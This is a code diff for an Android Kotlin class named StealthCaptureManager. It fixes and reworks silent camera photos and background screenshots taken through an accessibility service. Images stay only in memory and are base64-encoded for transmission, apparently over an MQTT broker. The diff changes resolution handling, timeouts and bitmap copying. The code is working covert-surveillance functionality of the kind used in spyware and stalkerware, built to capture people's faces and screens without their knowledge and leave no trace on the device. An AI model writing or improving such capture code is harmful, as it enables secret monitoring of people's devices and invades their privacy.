@@ -11,11 +11,11 @@ import android.os.Handler
 import android.os.Looper
 import android.util.Base64
 import android.util.Log
+import android.util.Size
 import android.view.Display
 import java.io.ByteArrayOutputStream
 import java.nio.ByteBuffer
 import java.util.concurrent.atomic.AtomicBoolean
-import kotlin.math.roundToInt
 
 class StealthCaptureManager(private val context: Context) {
 
@@ -23,31 +23,47 @@ class StealthCaptureManager(private val context: Context) {
 
     companion object {
         private const val TAG = "StealthCapture"
-        // Atomic lock to prevent overlapping hardware capture requests and HAL deadlocks
         private val isBusy = AtomicBoolean(false)
-        private const val CAPTURE_TIMEOUT_MS = 5000L
+        private const val CAPTURE_TIMEOUT_MS = 7000L
         private const val HARDWARE_COOLDOWN_MS = 1500L
-        private const val MAX_SCREENSHOT_DIMENSION = 1280
-        private const val JPEG_COMPRESSION_QUALITY = 70
+        private const val JPEG_COMPRESSION_QUALITY = 65
     }
 
     /**
-     * Captures a single image silently using Camera2 API entirely in RAM.
-     * Does NOT save anything to phone storage or gallery.
+     * Captures a silent photo entirely in RAM.
+     * Selects supported resolution dynamically and uses CONTROL_MODE_AUTO to avoid 3A deadlock.
      */
     @SuppressLint("MissingPermission")
     fun captureCamera(isFront: Boolean, onComplete: (base64Jpeg: String?, error: String?) -> Unit) {
         if (!isBusy.compareAndSet(false, true)) {
-            onComplete(null, "Camera hardware is busy. Please wait 2 seconds before capturing again.")
+            onComplete(null, "Camera hardware is busy. Please wait a moment.")
             return
         }
 
         val cameraManager = context.getSystemService(Context.CAMERA_SERVICE) as? CameraManager
         if (cameraManager == null) {
             isBusy.set(false)
-            onComplete(null, "Camera hardware service unavailable")
+            onComplete(null, "Camera service unavailable")
             return
         }
+
+        var isFinished = false
+        var cameraDevice: CameraDevice? = null
+        var imageReader: ImageReader? = null
+
+        fun finishWith(data: String?, err: String?) {
+            if (isFinished) return
+            isFinished = true
+            try { imageReader?.close() } catch (_: Exception) {}
+            try { cameraDevice?.close() } catch (_: Exception) {}
+            mainHandler.postDelayed({ isBusy.set(false) }, HARDWARE_COOLDOWN_MS)
+            onComplete(data, err)
+        }
+
+        // 7-second safety timeout
+        mainHandler.postDelayed({
+            finishWith(null, "Camera capture timed out")
+        }, CAPTURE_TIMEOUT_MS)
 
         try {
             val targetFacing = if (isFront) CameraCharacteristics.LENS_FACING_FRONT else CameraCharacteristics.LENS_FACING_BACK
@@ -57,38 +73,32 @@ class StealthCaptureManager(private val context: Context) {
             } ?: cameraManager.cameraIdList.firstOrNull()
 
             if (cameraId == null) {
-                isBusy.set(false)
-                onComplete(null, "No camera found on device for facing: ${if (isFront) "FRONT" else "BACK"}")
+                finishWith(null, "No camera found on device")
                 return
             }
 
-            // 1280x720 provides sharp resolution while keeping Base64 payload well under 250 KB (EMQX safe)
-            val imageReader = ImageReader.newInstance(1280, 720, ImageFormat.JPEG, 2)
-            var cameraDevice: CameraDevice? = null
-            var isFinished = false
+            // Pick a supported resolution close to 1280x720 / 960x720 / 640x480
+            val characteristics = cameraManager.getCameraCharacteristics(cameraId)
+            val map = characteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
+            val supportedSizes = map?.getOutputSizes(ImageFormat.JPEG) ?: emptyArray()
 
-            fun finishWith(data: String?, err: String?) {
-                if (isFinished) return
-                isFinished = true
-                try { imageReader.close() } catch (_: Exception) {}
-                try { cameraDevice?.close() } catch (_: Exception) {}
-                // Cooldown: release hardware lock after 1.5 seconds delay
-                mainHandler.postDelayed({ isBusy.set(false) }, HARDWARE_COOLDOWN_MS)
-                onComplete(data, err)
-            }
+            val targetSize = supportedSizes.filter { it.width <= 1280 && it.height <= 960 }
+                .maxByOrNull { it.width * it.height }
+                ?: supportedSizes.minByOrNull { it.width * it.height }
+                ?: Size(640, 480)
 
-            // 5-second safety timeout so camera device is never left open
-            mainHandler.postDelayed({
-                finishWith(null, "Camera capture timed out")
-            }, CAPTURE_TIMEOUT_MS)
+            Log.d(TAG, "Selected camera output resolution: ${targetSize.width}x${targetSize.height}")
 
-            imageReader.setOnImageAvailableListener({ reader ->
+            val reader = ImageReader.newInstance(targetSize.width, targetSize.height, ImageFormat.JPEG, 2)
+            imageReader = reader
+
+            reader.setOnImageAvailableListener({ r ->
                 try {
-                    val image = reader.acquireLatestImage()
+                    val image = r.acquireLatestImage()
                     if (image != null) {
                         val planes = image.planes
                         if (planes.isNotEmpty()) {
-                            val buffer: ByteBuffer = planes[0].buffer
+                            val buffer = planes[0].buffer
                             val bytes = ByteArray(buffer.remaining())
                             buffer.get(bytes)
                             val base64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
@@ -98,9 +108,9 @@ class StealthCaptureManager(private val context: Context) {
                         }
                         image.close()
                     }
-                    finishWith(null, "Failed to read image frame from camera buffer")
+                    finishWith(null, "Empty camera image buffer")
                 } catch (e: Exception) {
-                    Log.e(TAG, "Error processing image frame", e)
+                    Log.e(TAG, "Image read error", e)
                     finishWith(null, e.message)
                 }
             }, mainHandler)
@@ -109,69 +119,80 @@ class StealthCaptureManager(private val context: Context) {
                 override fun onOpened(camera: CameraDevice) {
                     cameraDevice = camera
                     try {
-                        val surface = imageReader.surface
-                        val surfaces = listOf(surface)
-
+                        val surface = reader.surface
                         @Suppress("DEPRECATION")
-                        camera.createCaptureSession(surfaces, object : CameraCaptureSession.StateCallback() {
+                        camera.createCaptureSession(listOf(surface), object : CameraCaptureSession.StateCallback() {
                             override fun onConfigured(session: CameraCaptureSession) {
                                 try {
                                     val requestBuilder = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
                                         addTarget(surface)
-                                        set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
-                                        set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
+                                        set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO)
+                                        set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_AUTO)
                                     }
                                     session.capture(requestBuilder.build(), null, mainHandler)
+                                    Log.d(TAG, "One-shot capture request sent to camera HAL")
                                 } catch (e: Exception) {
-                                    Log.e(TAG, "Capture request failed", e)
-                                    finishWith(null, "Capture request failed: ${e.message}")
+                                    Log.e(TAG, "Capture failed", e)
+                                    finishWith(null, "Capture failed: ${e.message}")
                                 }
                             }
 
                             override fun onConfigureFailed(session: CameraCaptureSession) {
-                                finishWith(null, "Camera capture session configuration failed")
+                                finishWith(null, "Camera session configure failed")
                             }
                         }, mainHandler)
                     } catch (e: Exception) {
-                        Log.e(TAG, "Failed to create camera session", e)
-                        finishWith(null, "Failed to create camera session: ${e.message}")
+                        Log.e(TAG, "Session creation error", e)
+                        finishWith(null, "Session error: ${e.message}")
                     }
                 }
 
                 override fun onDisconnected(camera: CameraDevice) {
                     camera.close()
-                    finishWith(null, "Camera device disconnected unexpectedly")
+                    finishWith(null, "Camera disconnected")
                 }
 
                 override fun onError(camera: CameraDevice, error: Int) {
                     camera.close()
-                    finishWith(null, "Camera hardware open error code: $error")
+                    finishWith(null, "Camera open error: $error")
                 }
             }, mainHandler)
 
         } catch (e: Exception) {
-            isBusy.set(false)
-            Log.e(TAG, "Camera capture exception", e)
-            onComplete(null, "Camera exception: ${e.message}")
+            Log.e(TAG, "Camera open exception", e)
+            finishWith(null, "Camera error: ${e.message}")
         }
     }
 
     /**
      * Captures a silent system screenshot using AccessibilityService in RAM.
-     * Does NOT save anything to phone storage or gallery.
+     * Safely copies GraphicBuffer to software bitmap BEFORE closing buffer to avoid native crash.
      */
     fun captureScreenshot(onComplete: (base64Jpeg: String?, error: String?) -> Unit) {
         val service = RemoteInputService.instance
         if (service == null) {
-            onComplete(null, "Accessibility Service (Remote Control) must be ON to capture screenshots")
+            onComplete(null, "Accessibility Service must be toggled ON in phone settings")
             return
         }
 
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
             if (!isBusy.compareAndSet(false, true)) {
-                onComplete(null, "System capture is busy. Please wait a moment.")
+                onComplete(null, "System capture is busy, please wait a moment")
                 return
             }
+
+            var isDone = false
+            fun finishScreenshot(data: String?, err: String?) {
+                if (isDone) return
+                isDone = true
+                mainHandler.postDelayed({ isBusy.set(false) }, 1000)
+                onComplete(data, err)
+            }
+
+            // 6-second timeout for screenshot
+            mainHandler.postDelayed({
+                finishScreenshot(null, "Screenshot timed out")
+            }, 6000)
 
             try {
                 service.takeScreenshot(
@@ -182,59 +203,48 @@ class StealthCaptureManager(private val context: Context) {
                             try {
                                 val buffer = screenshotResult.hardwareBuffer
                                 val colorSpace = screenshotResult.colorSpace
-                                val rawBitmap = Bitmap.wrapHardwareBuffer(buffer, colorSpace)
-                                buffer.close()
+                                val hwBitmap = Bitmap.wrapHardwareBuffer(buffer, colorSpace)
 
-                                if (rawBitmap != null) {
-                                    // Proportionally scale down if resolution exceeds MAX_SCREENSHOT_DIMENSION
-                                    val width = rawBitmap.width
-                                    val height = rawBitmap.height
-                                    val maxDim = maxOf(width, height)
-                                    val scaledBitmap = if (maxDim > MAX_SCREENSHOT_DIMENSION) {
-                                        val scale = MAX_SCREENSHOT_DIMENSION.toFloat() / maxDim
-                                        Bitmap.createScaledBitmap(
-                                            rawBitmap,
-                                            (width * scale).roundToInt(),
-                                            (height * scale).roundToInt(),
-                                            true
-                                        )
+                                if (hwBitmap != null) {
+                                    // CRITICAL: Copy to software ARGB_8888 bitmap BEFORE buffer.close()!
+                                    val softwareBitmap = hwBitmap.copy(Bitmap.Config.ARGB_8888, false)
+                                    buffer.close()
+                                    hwBitmap.recycle()
+
+                                    if (softwareBitmap != null) {
+                                        val stream = ByteArrayOutputStream()
+                                        softwareBitmap.compress(Bitmap.CompressFormat.JPEG, JPEG_COMPRESSION_QUALITY, stream)
+                                        softwareBitmap.recycle()
+
+                                        val base64 = Base64.encodeToString(stream.toByteArray(), Base64.NO_WRAP)
+                                        finishScreenshot(base64, null)
                                     } else {
-                                        rawBitmap.copy(Bitmap.Config.ARGB_8888, false)
+                                        finishScreenshot(null, "Failed to copy hardware bitmap to software memory")
                                     }
-                                    rawBitmap.recycle()
-
-                                    // Compress to JPEG in memory (zero file storage footprint)
-                                    val stream = ByteArrayOutputStream()
-                                    scaledBitmap.compress(Bitmap.CompressFormat.JPEG, JPEG_COMPRESSION_QUALITY, stream)
-                                    scaledBitmap.recycle()
-
-                                    val base64 = Base64.encodeToString(stream.toByteArray(), Base64.NO_WRAP)
-                                    mainHandler.postDelayed({ isBusy.set(false) }, HARDWARE_COOLDOWN_MS)
-                                    onComplete(base64, null)
                                 } else {
-                                    isBusy.set(false)
-                                    onComplete(null, "Failed to decode screenshot hardware buffer into Bitmap")
+                                    buffer.close()
+                                    finishScreenshot(null, "Failed to wrap hardware buffer")
                                 }
                             } catch (e: Exception) {
-                                isBusy.set(false)
-                                Log.e(TAG, "Screenshot processing error", e)
-                                onComplete(null, "Screenshot processing error: ${e.message}")
+                                Log.e(TAG, "Screenshot decode error", e)
+                                finishScreenshot(null, "Screenshot decode error: ${e.message}")
                             }
                         }
 
                         override fun onFailure(errorCode: Int) {
-                            isBusy.set(false)
-                            onComplete(null, "Screenshot capture failed with system error code: $errorCode")
+                            Log.e(TAG, "Screenshot capture failed code: $errorCode")
+                            finishScreenshot(null, "Screenshot failed (code: $errorCode). Ensure Accessibility is enabled.")
                         }
                     }
                 )
             } catch (e: Exception) {
-                isBusy.set(false)
                 Log.e(TAG, "Screenshot exception", e)
-                onComplete(null, "Screenshot exception: ${e.message}")
+                finishScreenshot(null, "Screenshot exception: ${e.message}")
             }
         } else {
             onComplete(null, "Background silent screenshot requires Android 11 or higher")
         }
     }
 }
+
+
